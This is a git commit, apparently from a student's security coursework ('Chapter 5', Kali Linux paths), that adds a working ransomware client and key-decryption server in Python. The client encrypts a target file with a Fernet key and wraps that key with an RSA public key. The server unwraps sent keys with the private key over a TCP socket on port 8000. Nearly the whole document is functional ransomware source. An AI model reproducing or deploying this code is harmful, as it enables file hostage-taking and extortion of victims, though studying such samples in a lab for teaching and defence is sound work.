3c50cd9b0763621ca5b92d54310e28b79964789c
vlunic00 <vlunic00@fesb.hr>
2025-01-30 21:14:22 +0100

    Added ransomware client-server connection

---
+++ Chapter 5/Ransomware Client & Server/ransomwareClient.py
@@ -0,0 +1,74 @@
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
+from cryptography.fernet import Fernet
+import sys
+import socket
+
+
+
+def encryptFile(file_to_encrypt):
+	symmetricKey = Fernet.generate_key()
+
+	FernetInstance = Fernet(symmetricKey)
+
+	with open("/home/kali/Desktop/Ransomware/public_key.key", "rb") as key_file:
+		public_key = serialization.load_pem_public_key(
+			key_file.read(),
+			backend = default_backend()
+		)
+
+	encryptedSymmetricKey = public_key.encrypt(
+		symmetricKey,
+		padding.OAEP(
+			mgf=padding.MGF1(algorithm=hashes.SHA256()),
+			algorithm = hashes.SHA256(),
+			label = None
+		)
+	)
+
+	with open("encryptedSymmetricKey.key","wb") as key_file:
+		key_file.write(encryptedSymmetricKey)
+
+	with open(file_to_encrypt, "rb") as file:
+		file_data = file.read()
+		encrypted_data = FernetInstance.encrypt(file_data)
+		
+	with open(file_to_encrypt, "wb") as file:
+		file.write(encrypted_data)
+	
+def sendEncryptedKey(eKeyFilePath, hostname, port):
+	with socket.create_connection((hostname, port)) as sock:
+		with open(eKeyFilePath, "rb") as encFile:
+			sock.send(encFile.read())
+		while True:
+			decryptedKey = sock.recv(1024)
+			
+			if decryptedKey:
+				return decryptedKey
+			
+			
+def decryptFile(file_path, key):
+	
+	FernetInstance = Fernet(key)
+	with open(file_path, "rb") as file_to_decrypt:
+		file_data = file_to_decrypt.read()
+		decrypted_data = FernetInstance.decrypt(file_data)
+	with open(file_path, "wb") as file:
+		file.write(decrypted_data)
+	
+
+if __name__ == "__main__":
+
+	if sys.argv[1] == "encrypt":
+		encryptFile(sys.argv[2])
+	
+	elif sys.argv[1] == "decrypt":
+		key = sendEncryptedKey("encryptedSymmetricKey.key", "localhost", 8000)
+		decryptFile(sys.argv[2], key)
+	else:
+		print("Unkonwn arguments: use either encrypt/decrypt & file address")
+	
+	
+
---
+++ Chapter 5/Ransomware Client & Server/ransomwareKeyDecryptor.py
@@ -0,0 +1,38 @@
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.backends import default_backend
+import socketserver
+import base64
+
+class ClientHandler(socketserver.BaseRequestHandler):
+
+	def handle(self):
+		encrypted_key = self.request.recv(1024)
+		
+		with open("/home/kali/Desktop/Ransomware/pub_priv_pair.key", "rb") as key_file:
+			private_key = serialization.load_pem_private_key(
+				key_file.read(),
+				backend=default_backend(),
+				password = None
+			)
+   
+		original_key = private_key.decrypt(
+		encrypted_key,
+		padding.OAEP(
+		   	mgf=padding.MGF1(algorithm=hashes.SHA256()),
+			algorithm=hashes.SHA256(),
+			label=None
+		)
+   		)
+   		
+		self.request.sendall(original_key)
+
+if __name__ == "__main__":
+	HOST, PORT = "", 8000
+	
+	tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)
+	try:
+		tcpServer.serve_forever()
+	except Exception as e:
+		print("There was an error: ", e)
